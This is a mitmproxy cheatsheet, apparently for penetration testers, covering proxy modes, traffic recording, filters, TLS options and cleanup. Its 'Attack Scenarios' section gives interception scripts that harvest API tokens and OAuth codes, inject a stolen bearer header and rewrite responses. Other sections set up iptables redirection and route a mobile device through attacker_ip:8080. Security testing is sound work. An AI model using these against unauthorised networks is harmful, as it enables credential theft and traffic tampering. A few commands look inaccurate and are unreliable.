# mitmproxy Cheatsheet

## Quick Start

```bash
# Console UI
mitmproxy

# Command-line
mitmdump

# Web interface
mitmweb
```

## Essential Commands

```bash
# Custom port
mitmproxy -p 8888
mitmdump -p 8888

# Transparent mode
mitmproxy --mode transparent

# SOCKS5 proxy
mitmproxy --mode socks5

# Reverse proxy
mitmproxy --mode reverse:https://target.local
```

## Recording and Replay

```bash
# Save traffic
mitmdump -w traffic.flow

# Replay traffic
mitmdump -r traffic.flow

# Save with timestamps
mitmdump -w +traffic_%.flow
```

## Scripting

```bash
# Execute script
mitmdump -s script.py

# Script with recording
mitmdump -s script.py -w output.flow

# Multiple scripts
mitmdump -s script1.py -s script2.py
```

## Filtering

```bash
# Filter display
mitmproxy --view-filter "~d target.local"

# Intercept filter
mitmproxy --intercept "~m POST"

# Ignore hosts
mitmdump --ignore-hosts "^(?!.*target\.local)"
```

## Attack Scenarios

### API Token Extraction

```bash
# Script: extract_tokens.py
from mitmproxy import http

def response(flow: http.HTTPFlow):
    if "token" in flow.response.text.lower():
        with open("tokens.txt", "a") as f:
            f.write(f"{flow.request.url}\n")

# Run
mitmdump -s extract_tokens.py -w api.flow
```

### OAuth Code Interception

```bash
# Script: oauth.py
from mitmproxy import http

def request(flow: http.HTTPFlow):
    if "authorization_code" in flow.request.url:
        with open("oauth.txt", "a") as f:
            f.write(f"{flow.request.url}\n")

# Run
mitmdump -s oauth.py -p 8080
```

### Header Injection

```bash
# Script: inject.py
from mitmproxy import http

def request(flow: http.HTTPFlow):
    flow.request.headers["Authorization"] = "Bearer stolen"

# Run
mitmdump -s inject.py
```

### Response Modification

```bash
# Script: modify.py
from mitmproxy import http

def response(flow: http.HTTPFlow):
    if "target.com" in flow.request.url:
        flow.response.text = "Modified content"

# Run
mitmdump -s modify.py
```

## Transparent Proxy Setup

```bash
# iptables redirect
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Start proxy
mitmproxy --mode transparent
```

## Common Filters

```bash
# By domain
~d target.local

# By URL regex
~u api/v[0-9]

# By method
~m POST

# By response code
~s 4[0-9][0-9]
~s 5[0-9][0-9]

# By content type
~t application/json

# By header
~h "Authorization"
```

## SSL/TLS Options

```bash
# Custom certificate
mitmdump --certs "*.target.local=cert.pem"

# Skip verification
mitmdump --ssl-insecure

# CA certificate location
~/.mitmproxy/mitmproxy-ca-cert.pem
```

## Debugging

```bash
# Verbose output
mitmdump -vv

# Debug to file
mitmdump -vv 2>&1 | tee debug.log

# Show all options
mitmdump --options
```

## Flow Analysis

```bash
# Convert to HAR
mitmdump -r traffic.flow -w traffic.har --set hardump=true

# Extract specific flows
mitmdump -r traffic.flow --view-filter "~d api.target" -w api.flow

# Replay client requests
mitmdump -C recorded.flow -p 8080
```

## Mobile Device Setup

```bash
# 1. Start proxy
mitmweb --web-port 8081 -p 8080

# 2. Configure device proxy to attacker_ip:8080

# 3. Install CA cert from:
# http://mitm.it

# 4. Install on device:
# Android: Settings > Security > Install from storage
# iOS: Settings > General > Profile > Install
```

## Cleanup

```bash
# Remove iptables rules
sudo iptables -t nat -D PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -D PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Remove CA certificate
sudo rm /usr/local/share/ca-certificates/mitmproxy.crt
sudo update-ca-certificates
```
